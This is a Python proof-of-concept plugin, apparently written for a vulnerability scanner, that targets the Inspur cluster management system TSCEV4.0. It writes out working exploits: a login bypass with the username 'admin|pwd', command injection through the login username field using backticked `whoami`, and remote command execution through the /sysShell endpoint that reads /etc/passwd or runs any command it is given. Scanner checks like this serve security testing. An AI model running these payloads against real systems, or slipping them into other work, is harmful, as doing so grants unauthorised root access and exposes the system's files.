from ServiceScanModel.models import ServiceScan

import re

import requests
import warnings
import json

from ..requestClass import Requests

session = requests.session()
warnings.filterwarnings("ignore")


class POC:
    def __init__(self, service: ServiceScan):
        self.service = service
        self.requestUtil = Requests(service.cookies)
        self.result = False

    def get_nodes(self, url):
        resp = session.post(url + "/monNodelist?op=getNodeList", verify=False)
        if "node" in resp.text:
            node_info = json.loads(resp.text)
            return (node_info["nodes"])
        else:
            return [""]

    def login_test(self, url):
        resp = session.post(url + "/login", data={"op": "login", "username": "admin|pwd", "password": ""}, verify=False)
        if '"exitcode":0,' in resp.text:
            return True
        else:
            return False

    def login_rce_test(self, url):
        resp = session.post(url + "/login", data={"op": "login", "username": r"1 2\',\'1\'\); `whoami`"}, verify=False)
        if 'root' in resp.text:
            return True
        else:
            return False

    def sysShell_rce_test(self, url, node, cmd=""):
        resp = session.post(url + "/sysShell",
                            data={"op": "doPlease", "node": node, "command": "cat /etc/passwd" if cmd == "" else cmd},
                            verify=False)
        if cmd == "":
            if 'root:x:0:0:root' in resp.text:
                return node
            else:
                return False
        else:
            return re.findall("<br>(.*)<br>", resp.text)[0].replace("<br>", "\n")

    def fingerprint(self):
        try:
            if "TSCEV4.0 login" in self.service.title:
                return True
        except:
            pass

    def poc(self):
        result = ["", ""]
        try:
            if self.login_test(self.service.url):
                result[0] = "浪潮管理系统V4.0未授权"
                result[1] = "未授权登录"
            else:
                return []
            if self.login_rce_test(self.service.url):
                result[0] = "浪潮管理系统V4.0RCE"
                result[1] += "<br>登录接口RCE"
            node = self.get_nodes(self.service.url)[0]
            specify = ""
            if node and self.sysShell_rce_test(self.service.url, node):
                result[0] = "浪潮管理系统V4.0RCE"
                result[1] += "<br>SysShell接口RCE"
                specify = node
            if not "RCE" in result[0]:
                result[2] = "warning"
            return (result, specify)
        except Exception as e:
            print(e)
            return []
